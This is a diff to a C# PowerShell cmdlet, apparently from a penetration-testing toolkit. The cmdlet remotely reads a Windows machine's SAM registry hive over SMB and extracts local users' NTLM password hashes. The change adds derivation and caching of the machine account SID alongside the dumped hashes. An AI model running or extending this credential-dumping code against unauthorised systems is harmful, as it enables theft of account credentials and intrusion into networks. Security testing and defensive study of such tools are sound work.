@@ -10,6 +10,7 @@ using Titanis;
 using Titanis.Msrpc.Msrrp;
 using Titanis.Msrpc.Msrrp.Cli;
 using Titanis.Winterop;
+using Titanis.Winterop.Security;
 using Titanis.Winterop.Sam;
 
 namespace Titanis.Tbo.Smb2.PowerShell
@@ -28,6 +29,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 	[OutputType(typeof(TboRegSamHashInfo))]
 	public sealed class GetTBORegSamHashes : TboRegCmdlet
 	{
+		private sealed record SamUserReadResult(List<TboRegSamHashInfo> Users, SecurityIdentifier? AccountDomainSid);
+
 		private const string SamAccountPath = @"SAM\SAM\Domains\Account";
 		private const string SamUsersPath = @"SAM\SAM\Domains\Account\Users";
 		private const int SamUserAttrCount = 17;
@@ -47,6 +50,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 		protected override void ProcessRecord(ISmbProviderInfo smb, CancellationToken cancellationToken)
 		{
+			var ingestCache = this.ResolveCacheIngestionEnabled(this.Cache);
+
 			byte[]? syskey = null;
 			try
 			{
@@ -91,12 +96,12 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				return;
 			}
 
-			List<TboRegSamHashInfo> userInfos;
+			SamUserReadResult result;
 			try
 			{
-				userInfos = RegistryRetryHelper.Execute(smb, this.ServerName, cancellationToken, SamRetryOptions, session =>
+				result = RegistryRetryHelper.Execute(smb, this.ServerName, cancellationToken, SamRetryOptions, session =>
 				{
-					return ReadSamUsers(smb, session, syskey, cancellationToken);
+					return ReadSamUsers(smb, session, syskey, deriveAccountDomainSid: ingestCache, cancellationToken);
 				});
 			}
 			catch (Exception ex)
@@ -106,11 +111,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				return;
 			}
 
-			var ingestCache = this.ResolveCacheIngestionEnabled(this.Cache);
-			foreach (var info in userInfos)
+			foreach (var info in result.Users)
 			{
 				if (ingestCache && !string.IsNullOrWhiteSpace(info.NtlmHashText))
 				{
+					var principalSid = result.AccountDomainSid != null
+						? result.AccountDomainSid.Concat(info.Rid).ToSddlString()
+						: null;
+
 					try
 					{
 						var contextJson = $"{{\"rid\":{info.Rid.ToString(CultureInfo.InvariantCulture)}}}";
@@ -119,8 +127,10 @@ namespace Titanis.Tbo.Smb2.PowerShell
 							ServerName = this.ServerName,
 							SourceKind = "Get-TBORegSamHashes",
 
-							// SAM hashing does not currently derive the full SID (machine SID + RID).
-							// Scope identity to the current machine to avoid cross-host collisions on common local names.
+							// Prefer full local account SID (machine SID + RID) when derivable.
+							// If SID derivation fails, scope the SID-less identity to the current machine
+							// to avoid cross-host collisions on common local names.
+							PrincipalSid = principalSid,
 							PrincipalDomain = this.ServerName,
 							PrincipalName = info.AccountName,
 							PrincipalType = "LocalUser",
@@ -144,10 +154,11 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			}
 		}
 
-		private List<TboRegSamHashInfo> ReadSamUsers(
+		private SamUserReadResult ReadSamUsers(
 			ISmbProviderInfo smb,
 			IRegistrySession session,
 			byte[] syskey,
+			bool deriveAccountDomainSid,
 			CancellationToken cancellationToken)
 		{
 			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening HKLM root on {this.ServerName}.");
@@ -162,31 +173,74 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				cancellationToken);
 			LogDiagnostic(smb, $"Get-TBORegSamHashes: HKLM opened on {this.ServerName}.");
 			var cache = TryGetSecretCache(session);
+
+			SecurityIdentifier? accountDomainSid = null;
+			if (deriveAccountDomainSid && cache != null && cache.TryGetSamAccountDomainSid(out var cachedSidText))
+			{
+				try
+				{
+					accountDomainSid = SecurityIdentifier.Parse(cachedSidText);
+					LogDiagnostic(smb, $"TBO: Registry secret cache hit (SAM account domain SID) for {this.ServerName}.");
+				}
+				catch
+				{
+					accountDomainSid = null;
+				}
+			}
+
 			SamStore? store = null;
 			byte[]? cachedMasterKey = null;
-			if (cache != null && cache.TryGetSamMasterKey(out cachedMasterKey))
+				var hasCachedMasterKey = cache != null && cache.TryGetSamMasterKey(out cachedMasterKey);
+				if (hasCachedMasterKey)
+				{
+					LogDiagnostic(smb, $"TBO: Registry secret cache hit (SAM master key) for {this.ServerName}.");
+					store = new SamStore(cachedMasterKey!);
+				}
+
+			var needsAccountKey = !hasCachedMasterKey || (deriveAccountDomainSid && accountDomainSid == null);
+			if (needsAccountKey)
 			{
-				LogDiagnostic(smb, $"TBO: Registry secret cache hit (SAM master key) for {this.ServerName}.");
-				store = new SamStore(cachedMasterKey);
-			}
-			else
-			{
-				LogDiagnostic(smb, $"TBO: Registry secret cache miss (SAM master key) for {this.ServerName}.");
 				LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM account key {SamAccountPath}.");
 				using var accountKey = localMachineKey.OpenSubkey(
 					SamAccountPath,
 					RegistryAccessRights.QueryValue | RegistryAccessRights.EnumerateSubkeys,
 					RegistryHelpers.BackupOptions,
 					cancellationToken).GetAwaiter().GetResult();
-				store = ExtractSamStore(smb, accountKey, syskey, cancellationToken, out var masterKey);
-				if (store?.HasMasterKey == true && masterKey != null && masterKey.Length > 0)
-					cache?.SetSamMasterKey(masterKey);
+
+				if (!hasCachedMasterKey)
+				{
+					LogDiagnostic(smb, $"TBO: Registry secret cache miss (SAM master key) for {this.ServerName}.");
+					store = ExtractSamStore(smb, accountKey, syskey, cancellationToken, out var masterKey);
+					if (store?.HasMasterKey == true && masterKey != null && masterKey.Length > 0)
+						cache?.SetSamMasterKey(masterKey);
+				}
+
+				if (deriveAccountDomainSid && accountDomainSid == null)
+				{
+					try
+					{
+							if (SamAccountDomainSidReader.TryReadAccountDomainSid(
+								accountKey,
+								cancellationToken,
+								msg => LogDiagnostic(smb, msg),
+								out var derived))
+							{
+								accountDomainSid = derived;
+								if (accountDomainSid != null)
+									cache?.SetSamAccountDomainSid(accountDomainSid.ToSddlString());
+							}
+						}
+					catch (Exception ex)
+					{
+						LogDiagnostic(smb, $"Get-TBORegSamHashes: failed to derive SAM account domain SID: {ex.Message}");
+					}
+				}
 			}
 			LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM store {(store?.HasMasterKey == true ? "has" : "missing")} master key on {this.ServerName}.");
 
 			List<TboRegSamHashInfo> userInfos = new();
 			if (store == null || !store.HasMasterKey)
-				return userInfos;
+				return new SamUserReadResult(userInfos, accountDomainSid);
 
 			List<RegistrySubkeyInfo> users;
 			Dictionary<uint, int> ridIndex = new();
@@ -206,7 +260,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			{
 				this.LogException(smb, "Get-TBORegSamHashes failed to enumerate SAM users", ex);
 				this.LogWarning(smb, $"Get-TBORegSamHashes failed to enumerate SAM users: {ex.Message}");
-				return userInfos;
+				return new SamUserReadResult(userInfos, accountDomainSid);
 			}
 
 			foreach (var userKeyInfo in users)
@@ -309,7 +363,7 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				LogDiagnostic(smb, "Get-TBORegSamHashes: SAM account names already populated; skipping Names correlation.");
 			}
 
-			return userInfos;
+			return new SamUserReadResult(userInfos, accountDomainSid);
 		}
 
 		private byte[] ExtractSyskey(ISmbProviderInfo smb, IRegistryKey localMachineKey, CancellationToken cancellationToken)
